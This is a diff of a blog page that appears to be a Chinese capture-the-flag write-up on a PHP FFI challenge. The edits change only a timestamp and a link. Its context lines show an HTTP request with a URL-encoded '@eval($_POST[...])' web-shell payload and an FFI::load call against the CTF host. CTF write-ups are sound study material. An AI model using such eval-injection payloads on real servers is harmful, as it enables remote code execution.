@@ -28,7 +28,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-23081ef4788a5488.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-074b4398d03ef2c7.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-cfe182c523ad3008.png">
-<meta property="og:updated_time" content="2020-06-29T15:07:42.604Z">
+<meta property="og:updated_time" content="2020-06-29T15:15:35.086Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-05c9d6d459f6ccb8.png">
   
@@ -204,7 +204,7 @@
 <p>尝试 FFI load flag.h，可以发现没有报500，说明成功加载。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: pwnable.org:19260</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"></span><br><span class="line">gml=$ffi = FFI::load("/flag.h");echo 1;</span><br></pre></td></tr></table></figure>
 
-<p>但是我们无法知道有什么方法，方法名是什么，也读取不了 flag.h，一直卡在这里。队里大佬开始 leak 内存来获取方法名，结果 leak 出了方法名：flag_fUn3t1on_fFi（我也不懂这些知识）。可以参考白泽的脚本：<a href="https://www.4hou.com/posts/p7BQ。" target="_blank" rel="noopener">https://www.4hou.com/posts/p7BQ。</a></p>
+<p>但是我们无法知道有什么方法，方法名是什么，也读取不了 flag.h，一直卡在这里。队里大佬开始 leak 内存来获取方法名，结果 leak 出了方法名：flag_fUn3t1on_fFi（我也不懂这些知识）。可以参考白泽的脚本：<a href="https://www.4hou.com/posts/p7BQ" target="_blank" rel="noopener">https://www.4hou.com/posts/p7BQ</a>。</p>
 <p>然后直接调用就好了：</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/9223743-05c9d6d459f6ccb8.png" alt="image.png"></p>
 <p>发现很多队伍做出来了… open_basedir 中间坏了一段时间，应该是被人给搞了，大家都去直接读取 flag.h 了。</p>
